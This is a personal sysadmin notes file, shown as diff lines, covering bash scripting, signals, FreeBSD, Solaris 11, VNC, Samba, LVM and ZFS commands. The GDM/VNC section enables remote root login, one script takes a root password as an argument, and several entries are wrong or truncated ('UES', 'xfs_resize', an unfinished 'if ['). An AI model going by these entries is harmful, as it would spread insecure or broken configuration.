+  echo $cmd $key $log $lat $file
+done < "$input"
+
+while read line; do echo $cmd $line; done < "$input"
+
+** select
+echo -e "\vRun rsync?\v"
+select run in "Yes" "No"; do
+case $run in
+    Yes)noconfirm=1
+	echo "########  ##     ## ##    ## ##    ## #### ##    ##  ######   "
+	echo "##     ## ##     ## ###   ## ###   ##  ##  ###   ## ##    ##  "
+	echo "##     ## ##     ## ####  ## ####  ##  ##  ####  ## ##        "
+	echo "########  ##     ## ## ## ## ## ## ##  ##  ## ## ## ##   #### "
+	echo "##   ##   ##     ## ##  #### ##  ####  ##  ##  #### ##    ##  "
+	echo "##    ##  ##     ## ##   ### ##   ###  ##  ##   ### ##    ##  "
+	echo "##     ##  #######  ##    ## ##    ## #### ##    ##  ######   "
+	rsynccommand
+	exit 0;;
+    No)exit 0;;
+esac
+
+done
+
+
+
+  echo "Do you wish to install this program?"
+  select yn in "Yes" "No"; do
+      case $yn in
+	  Yes ) make install; break;;
+	  No ) exit;;
+      esac
+  done
+
+  With select you don't need to sanitize the input... it prompts you with your choices, and you type a number corresponding to the choice you want. Select also loops automatically... there's no need for a 'while true' loop to retry if they give invalid input.
+
+# Another cooler example
+
+  select option in "Backup" "Restore"; do
+
+case $option in
+    Backup)
+	echo "Creating archive..."
+	tar vzcf $backups/settings-$(date +%F-%H.%M.%S%p).tar.gz /data/data/com.android.providers.settings/databases/settings.db && (
+	    echo "Done!" ) || ( echo "Error creating archive!" )
+	exit
+
+	;;
+
+    Restore)
+	echo $(dirname $0)
+	echo "Select an archive"
+#	array=($(ls $(dirname $0|grep -Eo "^backups")|grep -E "^settings"))	# internal error: print_columns called with n=0 <= 0
+	array=($(ls $backups|grep -E "^settings"))
+	select archive in ${array[*]}; do
+
+	break
+	done
+	if [
+	tar vzxf $backups/$archive -C / && (
+	    echo "Done!" ) || ( echo "Error restoring archive!" )
+	exit
+
+	;;
+esac
+done
+
+** setterm
+   Turn off screen blanking
+   setterm -blank
+
+** shift
+  shift - shift positional parameters
+
+  while test $# -gt 0; do
+
+  $ set a b c d e
+  $ shift 2
+  $ echo $*
+  c d e
+
+# Argument order = -t test -r server -p password -v
+TEST=$2
+SERVER=$4
+PASSWD=$6
+if [[ $# -gt 6 ]]
+then
+    VERBOSE=1
+else
+     VERBOSE=2
+fi
+
+Alright, this works, but if you want to run the script with the arguments in a different way? Or if you forget and put it in the right order? It'll not work, so, this is an ugly solution.
+
+Ok, but how can you deal with arguments not worrying about the order and if needs an argument or not? Getopts is the answer ;)
+
+Let's see how we can write the script using getopts and them we explain how it works.
+
+The new script (it's bigger, I'll explain why):
+#!/bin/bash
+# Argument = -t test -r server -p password -v
+
+usage()
+{
+cat << EOF
+usage: $0 options
+
+This script run the test1 or test2 over a machine.
+
+OPTIONS:
+   -h      Show this message
+   -t      Test type, can be 'test1' or 'test2'
+   -r      Server address
+   -p      Server root password
+   -v      Verbose
+EOF
+}
+
+TEST=
+SERVER=
+PASSWD=
+VERBOSE=
+while getopts "ht:r:p:v" OPTION
+do
+     case $OPTION in
+         h)
+             usage
+             exit 1
+             ;;
+         t)
+             TEST=$OPTARG
+             ;;
+         r)
+             SERVER=$OPTARG
+             ;;
+         p)
+             PASSWD=$OPTARG
+             ;;
+         v)
+             VERBOSE=1
+             ;;
+         ?)
+             usage
+             exit
+             ;;
+     esac
+done
+
+if [[ -z $TEST ]] || [[ -z $SERVER ]] || [[ -z $PASSWD ]]
+then
+     usage
+     exit 1
+fi
+
+** Hidden Password with asterisks
+#!/bin/bash
+unset password
+prompt="Enter Password:"
+while IFS= read -p "$prompt" -r -s -n 1 char
+do
+    if [[ $char == $'\0' ]]
+    then
+        break
+    fi
+    prompt='*'
+    password+="$char"
+done
+echo
+echo "Done. Password=$password"
+
+# IFS
+$IFS
+
+    internal field separator
+
+    This variable determines how Bash recognizes fields, or word boundaries, when it interprets character strings.
+
+    $IFS defaults to whitespace (space, tab, and newline), but may be changed, for example, to parse a comma-separated data file. Note that $* uses the first character held in $IFS. See Example 5-1.
+** Math : $(( ))
+   FILES[$file_count]=$filename
+   file_count=$(($file_count+1))
+** Scripting : Getting user input
+The simplest and most widely available method to get user input at a shell prompt is the 'read' command. The best way to illustrate its use is a simple demonstration:
+
+while true; do
+    read -p "Do you wish to install this program?" yn
+    case $yn in
+        [Yy]* ) make install; break;;
+        [Nn]* ) exit;;
+        * ) echo "Please answer yes or no.";;
+    esac
+done
+
+Another method, pointed out by Steven Huwig, is bash's 'select' command. Here is the same example using select:
+
+echo "Do you wish to install this program?"
+select yn in "Yes" "No"; do
+    case $yn in
+        Yes ) make install; break;;
+        No ) exit;;
+    esac
+done
+
+With select you don't need to sanitize the input... it prompts you with your choices, and you type a number corresponding to the choice you want. Select also loops automatically... there's no need for a 'while true' loop to retry if they give invalid input.
+** Special Shell Variables Used in Scripts
+   Variable		Meaning
+   $#			The number of arguments.
+   $0			The command name.
+   $1, $2, ... , $9	The individual arguments of the command.
+   $*			The entire list of arguments, treated as a single word.
+   $@			The entire list of arguments, treated as a series of words.
+   $?			The exit status of the previous command. The value 0 denotes successful completion.
+   $$			The process id of the current process.
+
+** Exit Codes : Checking
+   if [ "$?" -ne "0" ]; then
+     echo "Setting password failed"
+     return 2
+   fi
+
+** Exit Codes : Executing commands depending on exit code
+   command && ( command-to-execute-on-success ) || ( command-to-execute-on-failure )
+
+*** Example:
+    #!/bin/sh
+    cp /foo /bar && ( echo Success ; echo Success part II ) || ( echo Failed ; echo Failed part II )
+
+** Exit Codes : Executing commands sequentially on success (exit 0)
+   &&
+
+*** Example:
+    #!/bin/sh
+    cd /usr/src/linux && \
+    make dep && make bzImage && make modules && make modules_install && \
+    cp arch/i386/boot/bzImage /boot/my-new-kernel && cp System.map /boot && \
+    echo "Your new kernel awaits, m'lord."
+
+** Exit Codes : General Info
+   | Variable        | Meaning                                                                             |
+   |-----------------+-------------------------------------------------------------------------------------|
+   | $#              | The number of arguments.                                                            |
+   | $0              | The command name.                                                                   |
+   | $1, $2, ..., $9 | The individial arguments of the command.                                            |
+   | $*              | The entire list of arguments, treated as a single word.                             |
+   | $@              | The entire list of arguments, treated as a series of words.                         |
+   | $?              | The exit status of the previous command. The value 0 denotes successful completion. |
+   | $$              | The process id of the current process.                                              |
+
+
+   The shell variable $? holds the numeric exit status of the most recently completed command. By convention, an exit status of zero denotes successful completion; other values denote error conditions of various sorts.
+
+   You can set the error code in a script by issuing the exit command, which terminates the script and posts the specified exit status. The format of the command is:
+
+   exit
+   status
+
+   0 = success
+   1 = fail
+
+   where status is a non-negative integer that specifies the exit status.
+
+* signal (7)
+  Standard Signals
+       Linux supports the standard signals listed below. Several  signal  num-
+       bers  are  architecture	dependent, as indicated in the "Value" column.
+       (Where three values are given, the first one is usually valid for alpha
+       and  sparc,  the	 middle one for i386, ppc and sh, and the last one for
+       mips.  A - denotes that a signal is absent on the corresponding	archi-
+       tecture.)
+
+       First the signals described in the original POSIX.1-1990 standard.
+
+       Signal	  Value	    Action   Comment
+       -------------------------------------------------------------------------
+       SIGHUP	     1	     Term    Hangup detected on controlling terminal
+				     or death of controlling process
+       SIGINT	     2	     Term    Interrupt from keyboard
+       SIGQUIT	     3	     Core    Quit from keyboard
+       SIGILL	     4	     Core    Illegal Instruction
+       SIGABRT	     6	     Core    Abort signal from abort(3)
+       SIGFPE	     8	     Core    Floating point exception
+       SIGKILL	     9	     Term    Kill signal
+       SIGSEGV	    11	     Core    Invalid memory reference
+       SIGPIPE	    13	     Term    Broken pipe: write to pipe with no readers
+       SIGALRM	    14	     Term    Timer signal from alarm(2)
+       SIGTERM	    15	     Term    Termination signal
+       SIGUSR1	 30,10,16    Term    User-defined signal 1
+       SIGUSR2	 31,12,17    Term    User-defined signal 2
+       SIGCHLD	 20,17,18    Ign     Child stopped or terminated
+       SIGCONT	 19,18,25    Cont    Continue if stopped
+       SIGSTOP	 17,19,23    Stop    Stop process
+       SIGTSTP	 18,20,24    Stop    Stop typed at tty
+       SIGTTIN	 21,21,26    Stop    tty input for background process
+       SIGTTOU	 22,22,27    Stop    tty output for background process
+
+       The  signals SIGKILL and SIGSTOP cannot be caught, blocked, or ignored.
+
+* Squid Web Proxy
+  /usr/local/squid/etc/squid.conf..............squid conf file
+  /usr/local/squid/libexec/cachemgr.cgi........configuration tool
+  /usr/local/squid/sbin/squid..................binary
+
+  Configuring as tranparent proxy:
+  +
+
+  # In httpd.conf file for manager access
+  /cgi-bin/cachemgr.cgi........manager cgi tool
+
+  # In squid conf file for stats access
+  acl <var> src <ipRange,ipAddr>
+  http_access allow <var> manager
+  192.168.1.88:3128/squid-internal-mgr/info.........stats
+
+* Startup at boot
+  You can add scripts into /etc/init.d/
+  You can add lines to /etc/rc.local
+
+* Sysrq-keys sequence
+  # Enable SysRq key
+  echo 1 > /proc/sys/kernel/sysrq
+
+  Reboot Even If System Utterly Broken
+  Raising Elephants Is So Utterly Boring
+  REISUB
+  BUSIER
+
+  unR_aw (take control of keyboard back from X),
+  tE_rminate (send SIGTERM to all processes, allowing them to terminate gracefully),
+  kI+ll (send SIGKILL to all processes, forcing them to terminate immediately),
+  S_ync (flush data to disk),
+  U_nmount (remount all filesystems read-only), reBoot.
+
+  0-9	Set the console log level, which controls the types of kernel messages that are output to the console
+  b	Immediately reboot the system, without unmounting partitions or syncing
+  c	Reboot kexec and output a crashdump
+  d	Display all currently held Locks
+  e	Send the SIGTERM signal to all processes except init (PID 1)
+  f	Call oom_kill, which kills a process to alleviate an OOM condition
+  g	When using Kernel Mode Setting, provides emergency support for switching back to the kernel's framebuffer console[4] If the in-kernel debugger 'kdb' is present, enter the debugger.
+  h	Output a terse help document to the console; Any key which is not bound to a command should also perform this action
+  i	Send the SIGKILL signal to all processes except init
+  k	Kill all processes on the current virtual console (Can be used to kill X and svgalib programs, see below); This was originally designed to imitate a Secure Access Key
+  m	Output current memory information to the console
+  n	Reset the nice level of all high-priority and real-time tasks
+  o	Shut off the system
+  p	Output the current registers and flags to the console
+  q	Display all active high-resolution timers and clock sources.
+  r	Switch the keyboard from raw mode, the mode used by programs such as X11 and svgalib, to XLATE mode
+  s	Sync all mounted filesystems
+  t	Output a list of current tasks and their information to the console
+  u	Remount all mounted filesystems in read-only mode
+  v	Output Voyager SMP processor information
+  w	Display list of blocked (D state) tasks
+
+* SQLITE3
+sqlite> SELECT Name, Day FROM Customers NATURAL JOIN Reservations;
+
+sqlite> SELECT Name, Day FROM Customers AS C JOIN Reservations
+   ...> AS R ON C.CustomerId=R.CustomerId;
+
+sqlite> SELECT Name, Day FROM Customers LEFT JOIN Reservations
+   ...> ON Customers.CustomerId = Reservations.CustomerId;
+
+sqlite> SELECT * FROM TABLE WHERE column LIKE '%cats%'
+
+* UNIX
+** chpass
+   change user information
+
+** http://www.freebsd.org/doc/handbook/
+
+** ipfw
+
+** pw
+      /etc/master.passwd      The user database
+      /etc/passwd	     A Version 7 format password file
+      /etc/login.conf	     The user capabilities database
+      /etc/group 	     The group database
+      /etc/master.passwd.new  Temporary copy of the master password file
+      /etc/passwd.new	     Temporary copy of the Version 7 password file
+      /etc/group.new	     Temporary copy of the group file
+      /etc/pw.conf	     Pw default options file
+      /var/log/userlog	     User/group modification logfile
+** sysinstall
+   sysinstall can be used to install partition an label a new disk using its GUI.
+
+* UNIX : FREEBSD
+  # Background
+  Boots via /sbin/init like any other Unix
+  /sbin/init runs /etc/rc, which sources /etc/rc.conf
+  /etc/rc.conf controls which services start at boot, and also configures things like IP address, default route, and jails
+
+  /sbin/init calls /etc/rc, which boots the system
+
+** 0 : install ports
+  # Fresh install of FREEBSD
+  # ports to install: bash, rsync, emacs, cmdwatch, exfat
+cd /usr/ports/shells/bash && make install clean BATCH=yes >/tmp/install-bash.log &
+cd /usr/ports/editors/emacs && make install clean BATCH=yes >/tmp/install-emacs.log &
+cd /usr/ports/net/rsync && make install clean BATCH=yes >/tmp/install-rsync.log &
+cd /usr/ports/sysutils/exfat-utils && make install clean BATCH=yes >/tmp/install-exfat-utils.log &
+cd /usr/ports/sysutils/fusefs-exfat && make install clean BATCH=yes >/tmp/install-fusefs-exfat.log &
+cd /usr/ports/sysutils/cmdwatch && make install clean BATCH=yes >/tmp/install-cmdwatch.log &
+
+** /etc/netstart
+   # /etc/netstart will reload and execute rc.conf
+
+** /etc/sysctl.conf
+   vfs.nfsd.server_min_nfsvers=4
+
+** COMMAND : camcontrol
+   # FreeBSD CAM subsystem
+   camcontrol rescan all
+
+   Tell the kernel to scan all busses in the system (with the
+   all argument), the given bus (XPT_SCAN_BUS), or bus:tar-
+   get:lun (XPT_SCAN_LUN) for new devices or devices that have
+   gone away.  The user may specify a scan of all busses, a sin-
+   gle bus, or a lun.  Scanning all luns on a target is not sup-
+   ported.
+
+     The camcontrol utility has	a number of primary functions, many of which
+     support an	optional device	identifier.  A device identifier can take one
+     of	three forms:
+
+     deviceUNIT	     Specify a device name and unit number combination,	like
+		     "da5" or "cd3".
+
+     bus:target	     Specify a bus number and target id.  The bus number can
+		     be	determined from	the output of ``camcontrol devlist''.
+		     The lun defaults to 0.
+
+     bus:target:lun  Specify the bus, target and lun for a device.  (e.g.
+		     1:2:0)
+
+** COMMAND : chsh
+   # Change default shell
+
+** COMMAND : cmdwatch
+   # Equivalent to Linux "watch"
+
+** COMMAND : coretemp
+   # load coretemp module
+   kldload coretemp
+
+   echo coretemp_load="YES" >> /boot/loader.conf
+
+   sysctl -a | grep temperature
+
+** COMMAND : dtrace
+  # dtrace -n :zfs:zio_checksum_error:entry
+cleek[bash]# dtrace -n :zfs:zio_checksum_error:entry
+dtrace: description ':zfs:zio_checksum_error:entry' matched 1 probe
+CPU     ID                    FUNCTION:NAME
+  0  40650         zio_checksum_error:entry
+  0  40650         zio_checksum_error:entry
+  0  40650         zio_checksum_error:entry
+  0  40650         zio_checksum_error:entry
+[...]
+
+** COMMAND : fuser
+   # fuser - identify users of files and devices
+   fuser -c /mnt/c1t2d1
+
+** COMMAND : ipfw
+   # default firewall
+
+** COMMAND : pw lock {username}
+   # lock account
+
+** COMMAND : pw unlock {username}
+   # unlock account
+
+** COMMAND : pw usermod {username} -G {group1,group2}
+   # add user to additional groups
+
+** COMMAND : sysctl
+   # In Linux, you can use /proc to see various bits of kernel and system info. In FreeBSD, the equivalent is sysctl. Linux also has sysctl, but its usefulness is nowhere near that of FreeBSD's sysctl. FreeBSD versions prior to 5.0 had a working /proc implementation. However, several serious security issues were discovered and it was decided to move away from /proc. The replacement is sysctl.
+   sysctl vfs.nfsd.server_min_nfsvers=4
+
+** COMMAND : smartctl
+   # Control and Monitor Utility for SMART Disks
+   /usr/ports/sysutils/smartmontools
+
+   smartctl --scan
+
+   # show temperature for all devices
+   for HDD in `smartctl --scan|grep -oE '^[/dev/daadapassses]+[0-9]{1,2}'`; do printf "=> $HDD\n"; smartctl -a $HDD|grep -E 'Temperature.*C'; done
+
+** make install clean BATCH=yes
+   # default all questions to yes for installation of port
+
+** nfs
+  # Configuration
+cat >> /etc/rc.conf <<EOF
+nfs_server_enable="YES"
+nfs_server_flags="-u -t -n 10"
+mountd_enable="YES"
+mountd_flags="-r"
+EOF
+
+  # Issue with mountd not working with ZFS
+  # https://groups.google.com/forum/#!topic/mailing.freebsd.stable/tenOz7NTenM
+  mountd_flags="-r -p 998"
+
+  nfs_server_flags=
+    # u		udp
+    # t		tcp
+    # n		start 10 instances of itself
+
+*** nfs client
+    cat >> /etc/rc.conf <<EOF
+    nfs_client_enable="UES"
+    nfs_client_flags="-n 4"
+    EOF
+
+*** mount_nfs
+    mount_nfs machine:dir localdirectory
+
+*** PKI
+    http://publib.boulder.ibm.com/infocenter/aix/v7r1/topic/com.ibm.aix.security/doc/security/nfs_public_key_crypto.htm
+
+** nfsv4
+   # Configuration settings needed for NFSv4
+
+   _Server Setup_
+   # rc.conf
+   nfs_server_enable="YES"
+   nfsv4_server_enable="YES"
+   nfsuserd_enable="YES"
+
+   # /etc/exports file
+   need at least one ''V4:'' line
+
+
+   _kernel support_
+   # requirements in kernel's config(5) file
+   options NFSD
+
+** SSH
+   # Enable su for user
+   I think you add the user
+
+** change hostname
+   '/etc/rc.conf', and add the following line:
+   hostname="new.host.name"
+
+* UNIX : Solaris 11
+** /var/adm/messages
+
+** COMMAND : cfgadm
+*** List disk visibility
+    cfgadm -la
+
+** COMMAND : devfsadm
+   # devfsadm(1M) maintains the /dev namespace
+   # Cleanup dandling /dev links
+   devfsadm -C -v
+
+   # disk, tape, port, audio, and  pseudo
+   devfsadm -C -c disk -v
+
+** COMMAND : dladm
+LINK                CLASS     MTU    STATE    OVER
+net1                phys      1500   down     --
+net3                phys      1500   up       --
+net0                phys      1500   down     --
+net2                phys      1500   down     --
+
+*** dladm show-phys
+    # show physical interfaces
+LINK              MEDIA                STATE      SPEED  DUPLEX    DEVICE
+net1              Ethernet             down       0      unknown   ixgbe1
+net3              Ethernet             up         1000   full      e1000g1
+net0              Ethernet             down       0      unknown   ixgbe0
+net2              Ethernet             down       0      unknown   e1000g0
+
+*** dladm show-phys -L
+LINK              DEVICE       LOC
+net0              ixgbe0       PCIE#4-x4
+net1              ixgbe1       PCIE#4-x4
+net2              e1000g0      PCIE#5-x8
+net3              e1000g1      PCIE#6-x8
+
+** COMMAND : format
+   # format -e
+
+** COMMAND : groups
+   # Lists all groups user is in
+   User can be in up to 15 secondary groups
+
+** COMMAND : iostat
+      example% iostat -xtc 5 2
+                             extended disk statistics       tty         cpu
+      disk r/s  w/s Kr/s Kw/s wait actv svc_t  %w  %b  tin tout us sy wt id
+      sd0   6.2 0.0 21.5  0.0 0.0  0.1  24.1   0   15   0   84  4  94  2 0
+      sd1   1.8 0.0 14.3  0.0 0.0  0.1  41.6   0    7
+      sd2   0.0 0.0  0.0  0.0 0.0  0.0   0.0   0    0
+      sd3   5.6 0.2 25.7  0.2 0.0  0.1  22.5   0   13
+                             extended disk statistics       tty         cpu
+      disk r/s  w/s Kr/s Kw/s wait actv svc_t  %w  %b  tin tout us sy wt id
+      sd0   2.6 3.0 20.7 22.7 0.1  0.2  59.2   6   19   0   84  3  85 11 0
+      sd1   4.2 1.0 33.5  8.0 0.0  0.2  47.2   2   23
+      sd2   0.0 0.0  0.0  0.0 0.0  0.0   0.0   0    0
+      sd3  10.2 1.6 51.4 12.8 0.1  0.3  31.2   3   31
+      example%
+
+      The fields have the following meanings:
+
+           disk    name of the disk
+           r/s     reads per second
+           w/s     writes per second
+           Kr/s    kilobytes read per second
+           Kw/s    kilobytes written per second
+           wait    average number of transactions waiting for ser-
+                   vice (queue length)
+           actv    average number of transactions  actively  being
+                   serviced  (removed  from  the queue but not yet
+                   completed)
+
+           %w      percent of time there are transactions  waiting
+                   for service (queue non-empty)
+           %b      percent of time the disk is busy  (transactions
+                   in progress)
+
+** COMMAND : ipadm
+*** ipadm create-ip net0
+
+*** ipadm show-if
+
+*** ipadm create-addr -T static -a 10.163.198.20/24 net0/acme
+    # description
+    acme
+
+** COMMAND : mdb
+*** Show memory usage
+    # Forces kernel debugging mode
+    mdb -k
+    ::memstat
+
+*** Show interrupts
+    echo ::interupts -d | mdb -k
+
+** COMMAND : newgrp <group>
+   # Logs user in under that group
+
+** COMMAND : pfiles
+   # Report fstat(2) and fcntl(2) information  for  all
+   open files in each process. For network endpoints,
+   the local (and peer if connected) address informa-
+   tion  is  also  provided.  For sockets, the socket
+   type, socket options and send and  receive  buffer
+   sizes  are  also  provided. In addition, a path to
+   the file is reported if the information is  avail-
+   able  from /proc/pid/path. This is not necessarily
+   the same name used to open the file.  See  proc(4)
+   for more information.
+
+   pfiles `fuser -c /var 2>/dev/null` | egrep '^[0-9]|/var'
+
+** COMMAND : preap
+   # Kill defunct zombie processes in the process table
+
+** COMMAND : prtconf
+   # print system configuration
+
+** COMMAND : prtdiag
+*** prtdiag -v
+    # Example
+    user@ZFS:~$ `which prtdiag` -v
+    System Configuration: Supermicro X7DCL
+    BIOS Configuration: Phoenix Technologies LTD 1.0b 05/12/2008
+    BMC Configuration: IPMI 1.0 (unknown)
+
+    ==== Processor Sockets ====================================
+
+    Version                          Location Tag
+    -------------------------------- --------------------------
+    Intel(R) Xeon(R) CPU           X LGA771
+    Intel(R) Xeon(R) CPU           X5 LGA771
+
+    ==== Memory Device Sockets ================================
+
+    Type        Status Set Device Locator      Bank Locator
+    ----------- ------ --- ------------------- ----------------
+    DDR2        in use 1   CH0_DIMM0           DIMM 0-1
+    DDR2        in use 1   CH1_DIMM0           DIMM 1-1
+    DDR2        in use 1   CH0_DIMM1           DIMM 0-2
+    DDR2        in use 1   CH1_DIMM1           DIMM 1-2
+    DDR2        empty  1   CH0_DIMM2           DIMM 0-3
+    DDR2        empty  1   CH1_DIMM2           DIMM 1-3
+
+    ==== On-Board Devices =====================================
+
+    ==== Upgradeable Slots ====================================
+
+    ID  Status    Type             Description
+    --- --------- ---------------- ----------------------------
+    1   available PCI              PCI#1-33MHz
+    2   available PCI              PCI#2-33MHz
+    3   available PCI              PCI#3-33MHz
+    4   in use    PCI Express      PCIE#4-x4
+    5   available PCI Express      PCIE#5-x8
+    6   in use    PCI Express      PCIE#6-x8
+
+*** ipmitool
+
+** COMMAND : rmformat
+   # Look for removable devices
+
+** COMMAND : smbadm
+*** smbadm show-shares localhost
+
+*** smbadm enable-user paulie
+
+** COMMAND : svcadm
+*** svcadm refresh svc:/network/ssh:default
+
+*** svcadm enable -r smb/server
+    # -r recurssive
+
+*** svcadm disable -t smb/server
+    # -t until reboot
+
+** Command : svccfg
+   # import, export, and modify service configurations
+
+** COMMAND : svcs
+*** svcs -a | grep -i vnc
+
+** COMMAND : testparm
+   # Check an smb.conf configuration file for internal correctness
+
+
+
+** Firewall (IP Filter)
+   https://docs.oracle.com/cd/E23824_01/html/821-1453/eupsq.html#SYSADV3eupsq
+
+
+
+
+** Enable Samba
+   # As root
+   pkg install samba
+
+   # Normal user
+   pfexec pkg install samba
+
+   # Set maximum groups to 1024
+   /etc/system
+   set ngroups_max=1024
+
+** Enable VNC
+by default, In Solaris 10, VNC service is almost configured. Below is the process to enable it.
+
+    Check VNC service
+
+root# svcs -a | grep -i vnc
+disabled 13:47:12 svc:/application/x11/xvnc-inetd:default
+
+    We need to enable the VNC service
+
+root# svcadm enable svc:/application/x11/xvnc-inetd:default
+
+    By default, it broken we need to do some changes.
+
+root# svcs svc:/application/x11/xvnc-inetd:default
+STATE STIME FMRI
+maintenance 14:22:41 svc:/application/x11/xvnc-inetd:default
+
+    Need to append vnc to the      /etc/services
+
+root# echo “vnc-server\t5900/tcp\t\t\t# Xvnc” >>/etc/services
+
+    Cross verify /etc/services
+
+root# tail /etc/services
+
+snmpd 161/udp snmp # SMA snmp daemon
+vnc-server 5900/tcp # Xvnc
+
+    Need to customizethe gnu display      manager
+
+root# ls -al /etc/X11/gdm/custom.conf
+/etc/X11/gdm/custom.conf: No such file or directory
+
+    configure and enable gnu display      manager for vnc
+
+root# cat >/etc/X11/gdm/custom.conf <<!
+[xdmcp]
+Enable=true
+[security]
+DisallowTCP=false
+AllowRoot=true
+AllowRemoteRoot=true
+!
+
+    Cross verify the customized      configuration file
+
+    root# ls -al /etc/X11/gdm/custom.conf
+  -rw-r–r– 1 root root 85 Dec 19 14:43 /etc/X11/gdm/custom.conf
+
+    Disable and enable and validate      the vnc service
+
+   root# svcadm disable svc:/application/x11/xvnc-inetd:default
+
+
+   root# svcadm enable svc:/application/x11/xvnc-inetd:default
+
+   root# svcs svc:/application/x11/xvnc-inetd:default
+
+
+   STATE STIME FMRI
+online 14:46:43 svc:/application/x11/xvnc-inetd:default
+
+    Now use VMC client on the network to  check the VNC server
+
+** Hostname
+   Setting the Host Name
+
+   In Oracle Solaris 11, /etc/nodename has been removed and replaced with the config/nodename property of the svc:/system/identity:node service.
+
+   To set the host name, we again use svccfg:
+
+   root@solaris:~# svccfg -s svc:/system/identity:node setprop config/nodename = astring: hostname
+   root@solaris:~# svcadm refresh svc:/system/identity:node
+   root@solaris:~# svcadm restart identity:node
+
+
+   Setting the host name this way will work for both automatic and manual network configurations.
+   Changes to /etc/hosts
+
+   In Oracle Solaris 11, the host's own entry in /etc/hosts is now the same as that of localhost. In previous versions of Oracle Solaris, this entry was associated with the first network interface.
+
+   root@solaris:~# cat /etc/hosts
+   #
+   # Copyright 2009 Sun Microsystems, Inc.  All rights reserved.
+   # Use is subject to license terms.
+   #
+   # Internet host table
+   #
+   ::1 localhost zfs zfs.bethesda.us.hq.skynet
+   127.0.0.1 localhost zfs zfs.bethesda.us.hq.skynet
+
+   Note: Some application installers might fail due to changes in the /etc/hosts file. If you experience this, you might have to edit /etc/hosts directly.
+
+** Samba sharing
+   https://docs.oracle.com/cd/E23824_01/html/821-1449/configuringoperationmodetm.html#configureworkgroupmodetask
+
+   svcadm enable -r smb/server
+   smbadm join -w SKYNET
+   vi /etc/pam.conf
+   # Solaris 11 GA only (other    password required    pam_smb_passwd.so.1    nowarn)
+   vi /etc/pam.d/other
+   # Solaris 11 U1 or later (password required       pam_smb_passwd.so.1 nowarn)
+   smbadm enable-user paulie
+   passwd user
+
+** Slow SSH logon (due to DNS)
+   root@cms-cluster1:~# uname -a
+   SunOS cms-cluster1 5.11 11.1 sun4v sparc sun4v
+   root@cms-cluster1:~# ssh -V
+   Sun_SSH_2.2, SSH protocols 1.5/2.0, OpenSSL 0x100000bf
+   root@cms-cluster1:~# echo .GSSAPIAuthentication no. >> /etc/ssh/sshd_config
+   root@cms-cluster1:~# echo .LookupClientHostnames no. >> /etc/ssh/sshd_config
+   root@cms-cluster1:~# svcadm restart ssh
+
+** Start VNC
+   /usr/bin/vncserver
+
+** Static IP
+   Creating a static IP address is a two-step process, and it involves creating an IP interface and an IP address. There can be multiple IP addresses associated with an IP interface. IP address objects have names in the form interface/description.
+
+   In the example shown in Listing 1, we use acme as the description.
+
+   root@solaris:~# ipadm create-ip net0
+   root@solaris:~# ipadm show-if
+   IFNAME     CLASS      STATE      ACTIVE      OVER
+   lo0        loopback   ok         yes         ---
+   net0       ip         down       no          ---
+   root@solaris:~# ipadm create-addr -T static -a 10.163.198.20/24 net0/acme
+   root@solaris:~# ipadm show-if
+   IFNAME      CLASS     STATE      ACTIVE      OVER
+   lo0         loopback  ok         yes         ---
+   net0        ip        ok         yes         ---
+   root@solaris:~# ipadm show-addr
+   ADDROBJ     TYPE      STATIC     ADDR
+   lo0/v4      static    ok         127.0.0.1/8
+   net0/acme   static    ok         10.163.198.20/24
+   lo0/v6      static    ok         ::1/128
+
+   Listing 1. Configuring a Static IP Address
+
+   We can then add a persistent default route:
+
+   root@solaris:~# route -p add default 10.163.198.1
+   add net default: gateway 10.163.198.1
+   add persistent net default: gateway 10.163.198.1
+
+** Resize Encrypted LVM
+   1. Extend the partition in parted
+   2. Load the cryptsetup module
+      # modprobe dm-crypt
+   3. Decrypt your filesystem
+      # cryptsetup luksOpen /dev/sda3 crypt1
+   4. Activate LVM
+      # vgscan --mknodes
+      # vgchange -ay
+   5. Resize the Crypt
+      # cryptsetup resize crypt1
+   6. Resize LVM PV
+      # pvresize /dev/mapper/crypt1
+   7. Unlock PV
+      # pvchange -x y /dev/mapper/crypt1
+   8. Resize LVM LV
+      # lvresize -l +100%FREE /dev/system/home
+   9. Lock PV
+      # pvchange -x n /dev/mapper/crypt1
+   10. Resize filesytem
+       # mount /dev/system/home /mnt/xfs
+       # xfs_resize /mnt/xfs
+   11. Unmount everything
+       # umount /mnt/xfs
+       # pvchange
+
+* ZFS
+** Analyst system boot-up performance
+   systemd-analyze plot > plot.svg
+
+** zfs
+   https://calomel.org/zfs_raid_speed_capacity.html
+   https://pthree.org/2012/12/05/zfs-administration-part-ii-raidz/
+
+   Capacity
+
+   ZFS is a 128-bit file system, so it can address 1.84 × 1019 times more data than 64-bit systems such as Btrfs. The limitations of ZFS are designed to be so large that they should not be encountered in the foreseeable future.
+
+   Some theoretical limits in ZFS are:
+
+     2^48: number of entries in any individual directory
+     16 exbibytes (2^64 bytes): maximum size of a single file
+     16 exbibytes: maximum size of any attribute
+     2^56 zebibytes (2^78 bytes): maximum size of any zpool
+     2^56: number of attributes of a file (actually constrained to 2^48 for the number of files in a ZFS file system)
+     2^64: number of devices in any zpool
+     2^64: number of zpools in a system
+     2^64: number of file systems in a zpool
+
+*** bootable ZFS root pool
+    # For a bootable ZFS root pool, the disks in the pool must contain slices and must be labeled with an SMI label. The simplest configuration would be to put the entire disk capacity in slice 0 and use that slice for the root pool.
+    # http://docs.oracle.com/cd/E19082-01/817-2271/gavwn/
+
+
+*** zfs clone pool/tank@snapshot pool/tank
+    # copy a snapshot to a new dataset
+
+*** zfs create
+
+*** zfs destroy [-d] pool/tank<@snapshot>
+    # destroy dataset <snapshot>
+
+    # -d		destroy held snapshot
+
+*** zfs diff pool/tank@before pool/tank@after
+    # changes between datasets
+    The type of change is described with a single character:
+    +   Indicates the file/directory was added in the later dataset
+    -   Indicates the file/directory was removed in the later dataset
+    M   Indicates the file/directory was modified in the later dataset
+    R   Indicates the file/directory was renamed in the later dataset
+
+*** zfs get <all | property>
+
+*** zfs hold [-r] keep pool/tank@snapshot
+    # Holding a snapshot prevents it from being destroyed
+    # Allows a snapshot with clones to be deleted pending the removal of the last clone by using the zfs destroy -d command
+
+*** zfs holds [-r] tank
+    # display a list of held snapshots
+
+*** zfs list <pool>
+
+*** zfs promote pool/tank
+   # replace a zfs file system with a zfs clone
+
+==
+# zfs create tank/test
+# zfs create tank/test/productA
+# zfs snapshot tank/test/productA@today
+# zfs clone tank/test/productA@today tank/test/productAbeta
+# zfs list -r tank/test
+NAME                       USED  AVAIL  REFER  MOUNTPOINT
+tank/test                  104M  66.2G    23K  /tank/test
